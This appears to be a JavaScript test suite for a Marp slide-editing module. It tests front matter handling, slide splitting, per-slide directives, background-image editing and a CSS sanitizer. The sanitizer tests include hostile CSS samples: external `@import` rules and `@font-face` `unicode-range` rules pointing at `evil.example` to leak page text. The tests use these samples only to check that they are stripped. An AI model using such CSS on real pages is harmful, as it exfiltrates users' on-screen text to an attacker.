// 執行：node --test src/slides.test.js
import { test } from "node:test";
import assert from "node:assert/strict";
import { Marp } from "@marp-team/marp-core";
import { loadDiagrams } from "./diagram.js";
import {
  isSlides,
  setupMarp,
  stripFrontMatter,
  stripImports,
  SLIDES_TEMPLATE,
  slideRanges,
  readFrontMatter,
  setGlobal,
  setSpot,
  setSpotDirective,
  toggleClass,
  addSlide,
  duplicateSlide,
  deleteSlide,
  readBackground,
  writeBackground,
  addBackground,
  removeBackground,
} from "./slides.js";

const marp = new Marp({ script: false });
setupMarp(marp);
const FM = "---\nmarp: true\n---\n";
const slides = (md) => slideRanges(marp, md).slides;
// 每頁的原文（不含分隔線），比較搬移結果用
const bodies = (md) => {
  const lines = md.split("\n");
  return slides(md).map((s) => lines.slice(s.separator ? s.start + 1 : s.start, s.end).join("\n").trim());
};

test("只有 front matter 寫 marp: true 才是簡報", () => {
  assert.equal(isSlides("---\nmarp: true\n---\n# A"), true);
  assert.equal(isSlides("---\ntheme: gaia\nmarp: true\n---"), true);
  assert.equal(isSlides(SLIDES_TEMPLATE), true);
  assert.equal(isSlides("---\nmarp: false\n---"), false);
  assert.equal(isSlides("# A\n---\nmarp: true\n---"), false); // 不在開頭
  assert.equal(isSlides("# 一般文件\n\n---\n\n分隔線"), false);
});

test("去掉 front matter", () => {
  assert.equal(stripFrontMatter("---\nmarp: true\n---\n# A"), "# A");
  assert.equal(stripFrontMatter("# A\n---\nb\n---"), "# A\n---\nb\n---");
});

test("拿掉外部 @import，保留主題字型", () => {
  const font = '@import "https://fonts.bunny.net/css?family=Lato";';
  assert.equal(
    stripImports(`${font}@import url("https://evil.example/x.css");@import 'https://evil.example/y.css';div{}`),
    `${font}  div{}`,
  );
});

test("拿掉 @font-face：unicode-range 可以逐字偷讀頁面上的文字", () => {
  const css = stripImports(
    "@font-face{font-family:Menlo;src:url(https://evil.example/?c=61);unicode-range:U+61}" +
      "@FONT-FACE {src:url(https://evil.example/b)}" +
      "@font@font-face{}-face{src:url(https://evil.example/c)}div{}",
  );
  assert.doesNotMatch(css, /@font-face/i);
  assert.match(css, /div\{\}$/);
});

test("拿掉 @property：會蓋掉 Tailwind 註冊的 --tw-* 變數", () => {
  const css = stripImports(
    '@property --tw-border-style{syntax:"*";inherits:false;initial-value:none}' +
      "@PROPERTY --tw-x {initial-value:1px}div{}",
  );
  assert.doesNotMatch(css, /@property/i);
  assert.match(css, /div\{\}$/);
});

const TABLE = "| 月份 | 線上 | 門市 |\n|---|---|---|\n| 1月 | 120 | 80.5 |\n| 2月 | 1,085.05 | 95 |\n| 合計 | =SUM(B2:B3) | =C2/3 |";
const slide = (body) => marp.render(`---\nmarp: true\n---\n\n${body}\n`);

test("簡報裡的表格計算公式，格式跟一般模式一樣", () => {
  const { html } = slide(TABLE);
  assert.match(html, /<td>1,205.05<\/td>/);
  assert.match(html, /<td>26.83<\/td>/);
  assert.match(slide("| a |\n|---|\n| \\=B1 |").html, /<td>=B1<\/td>/); // \= 不是公式
});

test("圖表註解：只顯示圖、不進講者備註、不影響 Marp 指令", async () => {
  await loadDiagrams(["xychart-beta\n  bar [1]"]);
  const { html, comments } = slide(`<!-- _class: invert -->\n\n<!-- chart bar B2:C3 -->\n${TABLE}`);
  assert.match(html, /<div class="diagram"><svg /);
  assert.doesNotMatch(html, /<table/);
  assert.match(html, /class="invert"/);
  assert.deepEqual(comments, [[]]);
});

test("註解和表格中間隔空行就不算圖表", () => {
  const { html, comments } = slide(`<!-- chart bar B2:C3 -->\n\n${TABLE}`);
  assert.match(html, /<table/);
  assert.doesNotMatch(html, /class="diagram"/);
  assert.deepEqual(comments, [["chart bar B2:C3"]]); // 一般註解照樣是講者備註
});

test("圖表錯誤顯示訊息，表格不顯示", () => {
  const { html } = slide(`<!-- chart pie B2:C3 -->\n${TABLE}`);
  assert.match(html, /<p class="diagram-error">圓餅圖只能選一欄<\/p>/);
  assert.doesNotMatch(html, /<table/);
});

test("一般模式不認的圖表註解，簡報也不認", () => {
  const indent = (s, p) => p + s.replaceAll("\n", `\n${p}`);
  for (const body of [
    `<!--\nchart bar B2:B3\n-->\n${TABLE}`,
    `<!--- chart bar B2:B3 --->\n${TABLE}`,
    `<!-- chart bar B2:B3 --> 說明\n${TABLE}`,
    indent(`<!-- chart bar B2:B3 -->\n${TABLE}`, "> "),
    `- 項目\n\n${indent(`<!-- chart bar B2:B3 -->\n${TABLE}`, "  ")}`,
  ]) {
    const { html } = slide(body);
    assert.match(html, /<table/, body);
    assert.doesNotMatch(html, /class="diagram/, body);
  }
});

test("分頁範圍：程式碼區塊裡的 --- 不算，*** 也能分頁，第 1 頁從 front matter 後面開始", () => {
  const md = `${FM}\n# 1\n\n\`\`\`\n---\n\`\`\`\n\n***\n\n# 2\n`;
  const [a, b] = slides(md);
  assert.equal(slides(md).length, 2);
  assert.deepEqual([a.start, a.end, a.separator], [3, 10, false]);
  assert.deepEqual([b.start, b.end, b.separator], [10, 14, true]);
  assert.deepEqual(bodies(md), ["# 1\n\n```\n---\n```", "# 2"]);
});

test("分頁範圍：front matter 格式錯誤時不會丟錯", () => {
  assert.doesNotThrow(() => slideRanges(marp, "---\nmarp: true\nfoo: [\n---\n# a"));
});

test("分頁範圍：有參考連結、註腳時照樣算得出來", () => {
  assert.equal(slides(`${FM}\n# 1 [x][r]\n\n[r]: http://e.com\n\n---\n\n# 2`).length, 2);
});

test("分頁範圍：front matter 結尾的 --- 後面有空白", () => {
  const md = "---\nmarp: true\n--- \n\n# 1\n\n---\n\n# 2";
  assert.deepEqual(slides(md).map((s) => [s.start, s.end]), [[3, 6], [6, 9]]);
});

test("整份設定：改 front matter 那一行，其他行不變", () => {
  const md = "---\nmarp: true\ntheme: gaia\n# 註解\n---\n\n# A";
  assert.equal(setGlobal(md, "theme", "uncover"), "---\nmarp: true\ntheme: uncover\n# 註解\n---\n\n# A");
});

test("整份設定：沒有就加在 front matter 最後面，4:3 不加引號", () => {
  assert.equal(setGlobal(`${FM}\n# A`, "size", "4:3"), "---\nmarp: true\nsize: 4:3\n---\n\n# A");
});

test("整份設定：theme 寫在註解裡就改最後一個註解", () => {
  const md = `${FM}\n<!-- theme: gaia -->\n# A\n\n---\n\n<!-- theme: uncover -->\n# B`;
  const out = setGlobal(md, "theme", "default");
  assert.equal(out, `${FM}\n<!-- theme: gaia -->\n# A\n\n---\n\n<!-- theme: default -->\n# B`);
  assert.equal(slideRanges(marp, out).global.theme, "default");
});

test("整份設定：頁碼只改 front matter，不動中途的註解", () => {
  const md = "---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- paginate: false -->\n# 2";
  assert.equal(
    setGlobal(md, "paginate", false),
    "---\nmarp: true\npaginate: false\n---\n\n# 1\n\n---\n\n<!-- paginate: false -->\n# 2",
  );
  const comment = `${FM}\n# 1\n\n---\n\n<!-- paginate: true -->\n# 2`;
  assert.equal(readFrontMatter(comment, "paginate"), undefined);
  assert.equal(setGlobal(comment, "paginate", true), `---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- paginate: true -->\n# 2`);
});

test("整份設定：頁首跟頁尾一樣加在 front matter 最後面", () => {
  assert.equal(setGlobal(`${FM}# A`, "header", "第一章"), "---\nmarp: true\nheader: 第一章\n---\n# A");
});

test("整份設定：頁尾有冒號要加引號，讀回來是原本的字", () => {
  const out = setGlobal(`${FM}\n# A`, "footer", "公司: 研發部");
  assert.match(out, /^footer: "公司: 研發部"$/m);
  assert.equal(readFrontMatter(out, "footer"), "公司: 研發部");
  assert.match(marp.render(out).html, /公司: 研發部/);
});

test("整份設定：頁尾有反斜線要加引號，不然整個 front matter 解析失敗", () => {
  const out = setGlobal("---\nmarp: true\ntheme: gaia\n---\n\n# A", "footer", "C:\\Users\\me");
  assert.equal(readFrontMatter(out, "footer"), "C:\\Users\\me");
  assert.equal(slideRanges(marp, out).global.theme, "gaia");
});

test("整份設定：清空就刪掉那一行", () => {
  assert.equal(setGlobal("---\nmarp: true\nfooter: 公司名稱\n---\n# A", "footer", ""), "---\nmarp: true\n---\n# A");
  assert.equal(setGlobal(`${FM}# A`, "footer", ""), `${FM}# A`);
});

test("單頁設定：插在分隔線下一行，第 1 頁插在 front matter 後面", () => {
  const md = `${FM}\n# 1\n\n---\n\n# 2`;
  const [a, b] = slides(md);
  assert.equal(setSpot(md, b, "class", "lead"), `${FM}\n# 1\n\n---\n<!-- _class: lead -->\n\n# 2`);
  assert.equal(setSpot(md, a, "class", "lead"), `${FM}<!-- _class: lead -->\n\n# 1\n\n---\n\n# 2`);
});

test("置中、深色開關：同時開、保留其他 class、關掉最後一個就刪掉那一行", () => {
  const page = (cls) => `${FM}\n# 1\n\n---\n\n${cls}# 2`;
  assert.equal(toggleClass(marp, page(""), 1, "lead"), `${FM}\n# 1\n\n---\n<!-- _class: lead -->\n\n# 2`);
  assert.equal(toggleClass(marp, page("<!-- _class: lead -->\n"), 1, "invert"), page("<!-- _class: lead invert -->\n"));
  assert.equal(toggleClass(marp, page("<!-- _class: lead custom -->\n"), 1, "lead"), page("<!-- _class: custom -->\n"));
  assert.equal(toggleClass(marp, page("<!-- _class: invert -->\n"), 1, "invert"), page(""));
});

test("置中、深色開關：延續下來的 class: invert 要一起算", () => {
  const md = "---\nmarp: true\nclass: invert\n---\n\n# 1\n\n---\n\n# 2";
  const lead = toggleClass(marp, md, 1, "lead");
  assert.match(lead, /<!-- _class: invert lead -->/);
  assert.equal(slides(lead)[1].directives.class, "invert lead");
  const light = toggleClass(marp, md, 1, "invert");
  assert.match(light, /<!-- _class: "" -->/);
  assert.equal(slides(light)[1].directives.class, "");
  assert.equal(slides(light)[0].directives.class, "invert"); // 其他頁不受影響
  assert.equal(toggleClass(marp, light, 1, "invert"), md); // 再按一次回到原樣
});

test("隱藏頁碼：只影響這一頁；跟延續下來的一樣就不寫", () => {
  const md = "---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n# 2\n\n---\n\n# 3";
  const hidden = setSpotDirective(marp, md, 1, "paginate", false);
  assert.match(hidden, /---\n<!-- _paginate: false -->\n\n# 2/);
  assert.deepEqual(slides(hidden).map((s) => s.directives.paginate), [true, false, true]);
  assert.equal(setSpotDirective(marp, hidden, 1, "paginate", true), md);
  assert.equal(setSpotDirective(marp, `${FM}\n# 1`, 0, "paginate", false), `${FM}\n# 1`);
});

test("隱藏頁碼：延續下來的 paginate: hold 也算有顯示", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!-- paginate: hold -->\n# 2\n\n---\n\n# 3`;
  const hidden = setSpotDirective(marp, md, 2, "paginate", false);
  assert.deepEqual(slides(hidden).map((s) => s.directives.paginate), [undefined, "hold", false]);
  assert.equal(setSpotDirective(marp, hidden, 2, "paginate", true), md);
});

test("新增投影片：插在這頁後面；最後一行有字也不會變成標題底線", () => {
  const md = `${FM}\n# 1\n\n---\n\n# 2\n\n---\n\n# 3`;
  assert.deepEqual(bodies(addSlide(md, slides(md)[1])), ["# 1", "# 2", "", "# 3"]);
  assert.deepEqual(bodies(addSlide(md, slides(md)[2])), ["# 1", "# 2", "# 3", ""]);
  const text = `${FM}\n文字`;
  assert.deepEqual(bodies(addSlide(text, slides(text)[0])), ["文字", ""]);
});

test("複製投影片：程式碼裡的 --- 不會切開；第 1 頁補分隔線，front matter 只有一份", () => {
  const md = `${FM}\n# 1\n\n\`\`\`\n---\n\`\`\`\n\n---\n\n# 2\n`;
  const out = duplicateSlide(md, slides(md)[0]);
  assert.deepEqual(bodies(out), ["# 1\n\n```\n---\n```", "# 1\n\n```\n---\n```", "# 2"]);
  assert.equal(out.match(/marp: true/g).length, 1);
  assert.deepEqual(bodies(duplicateSlide(md, slides(md)[1])), ["# 1\n\n```\n---\n```", "# 2", "# 2"]);
});

test("刪除投影片：刪第 1 頁保留 front matter；只剩一頁不能刪", () => {
  const md = `---\nmarp: true\ntheme: gaia\n---\n\n# 1\n\n---\n\n# 2\n\n---\n\n# 3\n`;
  const first = deleteSlide(md, slides(md), 0);
  assert.equal(first, `---\nmarp: true\ntheme: gaia\n---\n\n# 2\n\n---\n\n# 3\n`);
  assert.deepEqual(bodies(deleteSlide(md, slides(md), 1)), ["# 1", "# 3"]);
  assert.deepEqual(bodies(deleteSlide(md, slides(md), 2)), ["# 1", "# 2"]);
  const one = `${FM}\n# 1`;
  assert.equal(deleteSlide(one, slides(one), 0), one);
  const styled = `${FM}\n<!-- style: section{color:red} -->\n# 1\n\n---\n\n# 2`;
  const out = deleteSlide(styled, slides(styled), 0);
  assert.equal(slideRanges(marp, out).global.style, "section{color:red}");
});

test("headingDivider：在 global 裡，工具列用它決定要不要隱藏投影片操作", () => {
  const md = "---\nmarp: true\nheadingDivider: 2\n---\n\n## a\n\n## b";
  assert.equal(slideRanges(marp, md).global.headingDivider, 2);
  assert.equal(slides(md).length, 2);
});

test("刪除投影片：這頁的 theme 註解留下來，延續的 class 一起刪", () => {
  const md = `${FM}\n<!-- theme: gaia -->\n<!-- class: invert -->\n# 1\n\n---\n\n# 2`;
  const next = deleteSlide(md, slides(md), 0);
  assert.equal(next, `${FM}<!-- theme: gaia -->\n\n# 2`);
  assert.equal(slideRanges(marp, next).global.theme, "gaia");
});

test("刪除投影片：整份的 <style> 區塊留下來，scoped 的一起刪", () => {
  const md = `${FM}\n<style>\nsection{color:red}\n</style>\n<style scoped>\nh1{color:blue}\n</style>\n# 1\n\n---\n\n# 2`;
  assert.equal(deleteSlide(md, slides(md), 0), `${FM}<style>\nsection{color:red}\n</style>\n\n# 2`);
});

test("刪除投影片：程式碼區塊裡的 <style>、設定註解是範例，一起刪", () => {
  const md = `${FM}\n\`\`\`html\n<style>section{background:red}</style>\n<!-- theme: uncover -->\n\`\`\`\n# 1\n\n---\n\n# 2`;
  assert.equal(deleteSlide(md, slides(md), 0), `${FM}\n# 2`);
});

test("一行有兩個註解：不整行換掉，改了不會生效就不改", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!-- _class: lead --> <!-- _paginate: false -->\n# 2`;
  assert.equal(toggleClass(marp, md, 1, "invert"), md);
});

test("單頁設定寫在多行註解裡：改了不會生效就不改", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!--\n_class: lead\n-->\n# 2`;
  assert.equal(toggleClass(marp, md, 1, "lead"), md);
});

test("隱藏頁碼：hold 算顯示，關掉時改成 false", () => {
  const md = `---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- _paginate: hold -->\n# 2`;
  const next = setSpotDirective(marp, md, 1, "paginate", false);
  assert.equal(slides(next)[1].directives.paginate, false);
  assert.ok(!next.includes("hold"));
});

test("front matter 的值照原文讀，大小寫交給呼叫端", () => {
  assert.equal(readFrontMatter("---\nmarp: true\npaginate: True\n---\n", "paginate"), "True");
});

// 第 index 頁的背景圖
const bgOf = (md, index = 0) => readBackground(md, slides(md)[index]);
const editBg = (md, change) => writeBackground(md, { ...bgOf(md), ...change });

test("背景圖：拆成欄位，不認得的字依原本順序保留", () => {
  const bg = bgOf(`${FM}\n![bg contrast right:30% fit blur:5px sepia](a.jpg)\n# A`);
  assert.deepEqual(
    { side: bg.side, width: bg.width, fit: bg.fit, brightness: bg.brightness, tone: bg.tone, rest: bg.rest, url: bg.url, count: bg.count },
    { side: "right", width: 30, fit: "contain", brightness: 1, tone: "sepia", rest: ["contrast", "blur:5px"], url: "a.jpg", count: 1 },
  );
});

test("背景圖：改寬度時 sepia 保留在後面，預設值不輸出", () => {
  const out = editBg(`${FM}\n![bg sepia right:30%](a.jpg)\n# A`, { width: 50 });
  assert.match(out, /^!\[bg right:50% sepia\]\(a\.jpg\)$/m);
  assert.match(editBg(`${FM}\n![bg brightness:0.5](a.jpg)`, { brightness: 1 }), /^!\[bg\]\(a\.jpg\)$/m);
  assert.match(editBg(`${FM}\n![bg right:40%](a.jpg)`, { side: "left" }), /^!\[bg left:40%\]\(a\.jpg\)$/m);
});

test("背景圖：left 沒帶比例是 50%，brightness 沒帶數值是 1.5，寫兩次面板只認最後一個", () => {
  assert.equal(bgOf(`${FM}\n![bg left](a.jpg)`).width, 50);
  assert.equal(bgOf(`${FM}\n![bg brightness](a.jpg)`).brightness, 1.5);
  assert.match(editBg(`${FM}\n![bg brightness](a.jpg)`, { brightness: 0.5 }), /^!\[bg brightness:0\.5\]\(a\.jpg\)$/m);
  assert.match(editBg(`${FM}\n![bg brightness:0.3 brightness:0.8](a.jpg)`, { fit: "contain" }), /^!\[bg contain brightness:0\.8\]/m);
});

test("背景圖：行內程式碼裡的不算，多張只調第一張", () => {
  assert.equal(bgOf(`${FM}\n# A \`![bg right:40%](圖片網址)\`\n`), null);
  const md = `${FM}\n# A\n\n---\n\ntext\n![bg](a.jpg)\n![bg](b.jpg)\n`;
  const bg = bgOf(md, 1);
  assert.equal(bg.count, 2);
  assert.equal(bg.url, "a.jpg");
  assert.match(writeBackground(md, { ...bg, side: "left" }), /!\[bg left:50%\]\(a\.jpg\)\n!\[bg\]\(b\.jpg\)/);
});

test("背景圖：網址裡成對的括號、後面的 title 都照原樣保留", () => {
  const paren = `${FM}\n![bg](https://e.org/Foo_(bar).jpg)`;
  assert.equal(bgOf(paren).url, "https://e.org/Foo_(bar).jpg");
  assert.match(editBg(paren, { side: "left" }), /^!\[bg left:50%\]\(https:\/\/e\.org\/Foo_%28bar%29\.jpg\)$/m);
  assert.equal(removeBackground(paren, bgOf(paren)), `${FM}`);
  const title = `${FM}\n![bg](a.jpg "標題")`;
  assert.equal(bgOf(title).url, "a.jpg");
  assert.match(editBg(title, { side: "left" }), /^!\[bg left:50%\]\(a\.jpg "標題"\)$/m);
});

test("背景圖：多張時位置以最後一張寫了 left、right 的為準，寫回只寫在第一張", () => {
  const md = `${FM}\n![bg](a.jpg)\n![bg right:40% blur](b.jpg)`;
  assert.deepEqual([bgOf(md).side, bgOf(md).width], ["right", 40]);
  assert.match(editBg(md, { side: "left" }), /^!\[bg left:40%\]\(a\.jpg\)\n!\[bg blur\]\(b\.jpg\)$/m);
  const oneLine = `${FM}\n![bg](a.jpg) ![bg left](b.jpg)`;
  assert.match(editBg(oneLine, { side: "" }), /^!\[bg\]\(a\.jpg\) !\[bg\]\(b\.jpg\)$/m);
  const kept = `${FM}\n![bg left:30%](a.jpg) ![bg right](b.jpg)`; // Marp 輸出 split:30%
  assert.deepEqual([bgOf(kept).side, bgOf(kept).width], ["right", 30]);
});

test("新增背景圖：插在設定註解後面，網址只編碼空白和括號", () => {
  const md = `${FM}\n# A\n\n---\n\n<!-- _class: lead -->\n\n# B\n`;
  const out = addBackground(md, slides(md)[1], "https://e.com/my photo (1).jpg");
  assert.equal(out, `${FM}\n# A\n\n---\n\n<!-- _class: lead -->\n\n![bg right:40%](https://e.com/my%20photo%20%281%29.jpg)\n\n# B\n`);
  assert.match(addBackground(`${FM}# A`, slides(`${FM}# A`)[0], "https://e.com/my%20photo.jpg"), /\(https:\/\/e\.com\/my%20photo\.jpg\)/);
  assert.equal(bgOf(out, 1).side, "right");
});

test("移除背景圖：整行刪掉並收掉多的空行；同一行還有字就只刪語法", () => {
  const md = `${FM}\n# A\n\n---\n\n<!-- _class: lead -->\n\n# B\n`;
  const added = addBackground(md, slides(md)[1], "a.jpg");
  assert.equal(removeBackground(added, bgOf(added, 1)), md);
  const inline = `${FM}\n文字 ![bg](a.jpg) 後面\n`;
  assert.equal(removeBackground(inline, bgOf(inline)), `${FM}\n文字  後面\n`);
});

test("背景圖：網址裡的 $ 照原樣寫回", () => {
  assert.match(editBg(`${FM}\n![bg](a.jpg)`, { url: "https://e.com/$1.jpg" }), /\(https:\/\/e\.com\/\$1\.jpg\)/);
});

test("背景圖：透明度沒帶數值是 0.5，調回 1 就拿掉", () => {
  assert.equal(bgOf(`${FM}\n![bg opacity](a.jpg)`).opacity, 0.5);
  assert.equal(bgOf(`${FM}\n![bg opacity:30%](a.jpg)`).opacity, 0.3);
  assert.match(editBg(`${FM}\n![bg opacity:0.3](a.jpg)`, { opacity: 1 }), /^!\[bg\]\(a\.jpg\)$/m);
  assert.match(editBg(`${FM}\n![bg](a.jpg)`, { opacity: 0.6, brightness: 0.8 }), /^!\[bg brightness:0\.8 opacity:0\.6\]/m);
});

test("背景圖：色調只認完整的 grayscale、sepia，只套一半的留在 rest", () => {
  assert.equal(bgOf(`${FM}\n![bg grayscale:100%](a.jpg)`).tone, "grayscale");
  const half = bgOf(`${FM}\n![bg sepia:0.5](a.jpg)`);
  assert.deepEqual([half.tone, half.rest], ["", ["sepia:0.5"]]);
  const both = bgOf(`${FM}\n![bg grayscale sepia](a.jpg)`);
  assert.deepEqual([both.tone, both.rest], ["grayscale", ["sepia"]]);
  assert.match(editBg(`${FM}\n![bg grayscale](a.jpg)`, { tone: "sepia" }), /^!\[bg sepia\]/m);
  assert.match(editBg(`${FM}\n![bg grayscale:1](a.jpg)`, { tone: "" }), /^!\[bg\]/m);
});

test("背景圖：auto 是填滿的一個值，選完整會換掉它", () => {
  const md = `${FM}\n![bg auto](a.jpg)`;
  assert.equal(bgOf(md).fit, "auto");
  assert.deepEqual(bgOf(md).rest, []);
  assert.equal(editBg(md, { fit: "contain" }).split("\n").pop(), "![bg contain](a.jpg)");
  assert.equal(editBg(md, { fit: "cover" }).split("\n").pop(), "![bg](a.jpg)");
});

test("背景圖：Marp 認得但面板讀不懂的寫法，bgs 有值、readBackground 是 null", () => {
  for (const body of ["![photo bg](a.jpg)", "![bg](<my pic.jpg>)", "x `a\nb` ![bg](a.jpg)"]) {
    const md = `${FM}\n${body}`;
    assert.equal(slides(md)[0].bgs.length, 1, body);
    assert.equal(bgOf(md), null, body);
  }
});
